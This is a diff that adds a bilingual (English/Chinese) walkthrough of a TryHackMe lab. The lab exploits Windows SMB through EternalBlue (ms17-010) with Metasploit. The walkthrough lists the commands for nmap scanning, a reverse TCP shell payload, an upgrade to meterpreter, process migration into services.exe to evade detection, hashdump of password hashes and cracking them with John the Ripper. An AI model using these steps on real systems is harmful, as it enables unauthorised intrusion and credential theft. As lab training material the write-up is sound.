@@ -1,0 +1,55 @@
+
+Reconnaissance
+1. How many ports are open with a port number under 1000?: sudo nmap -sS -sC -sV -O <target-ip>
+2. What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067): sudo nmap --sccript vuln <target-ip>
+(After knowing the vulnerability, we can further gain access by using Metasploit)
+
+Gain Access
+3. Start Metasploit: msfconsole
+4. Find the exploitation code: search ms17-010
+(ms17-010 is the vulnerability found in the step 2)
+5. Use the exploitation code: use exploit/windows/smb/ms17_010_eternalblue
+6. Set the payload: set payload windows/x64/shell/reverse_tcp
+7. Find options: options
+8. the required value is RHOSTS
+9. Set the RHOSTS: set RHOSTS <target-ip>
+10. Set the LHOSTS: set LHOSTS tun0
+(因為我們透過VPN連線到TryHackMe，所以要記得設定這一步)
+11. Run the exploit: exploit
+(如果成功的話，會看到"WIN")
+
+Escalate
+12. 按Ctrl+z將session收到背景，然後回到metasploit的畫面
+13. 接下來要使用meterpreter: 
+search shell_to_meterpreter
+use post/multi/manage/shell_to_meterpreter
+(Meterpreter相當特別，它是Metasploit Framework 內含的Meta-Interpreter
+可執行一些其他需純粹以組合語言實作的複雜功能，以這種方法能夠開發出DLL型態的檔案，
+以便在漏洞利用行為執行後，能夠上傳或注入目標電腦記憶體中的應用程式處理程序，
+而且不需存取磁碟，因此也就無法輕易被一般防毒軟體所偵測到。)
+14. 檢查需要設定的變數，會發現SESSION跟LHOST都需要設定:
+options
+set SESSION 1
+set LHOST tun0
+15. 執行: exploit
+16. 跑完之後列出session，然後選擇使用"Type"是meterpreter開頭的那個(假設其session number is 2):
+sessions
+sessions -i 2
+(完成之後就會進到meterpreter開頭的命令列)
+17. 將現在的session process移動到另一個，這樣算是一種把自己隱藏起來的技巧:
+ps (然後找到services.exe的PID，假設是688)
+migrate 688 (成功的話會看到migration complete successfully)
+18. 確認目前的身分(權限)，因為後面要用hashdump，所以身分必須是系統級的:
+getuid (如果是NT AUTHORITY\SYSTEM就對了)
+hashdump (dump完會出現使用者帳號及hash過的密碼)
+
+Cracking
+19. 將目標帳號及hash過的密碼存成一個任一個文字文件(假設目標帳號是Jon，存成Jon文件)
+要連"Jon:"一起存在文件裡，不能只有存hash值而已
+20. 用johntheripper破解密碼: john -w="/usr/share/wordlists/rockyou.txt" Jon --format=NT
+(這裡有一個特別的bug，如果沒有將rockyou.txt文件用雙引號夾起來，就沒辦法破解)
+
+Find Flag
+21. 直接用搜尋的方式去找檔名有flag的檔: search -f flag*
+
+
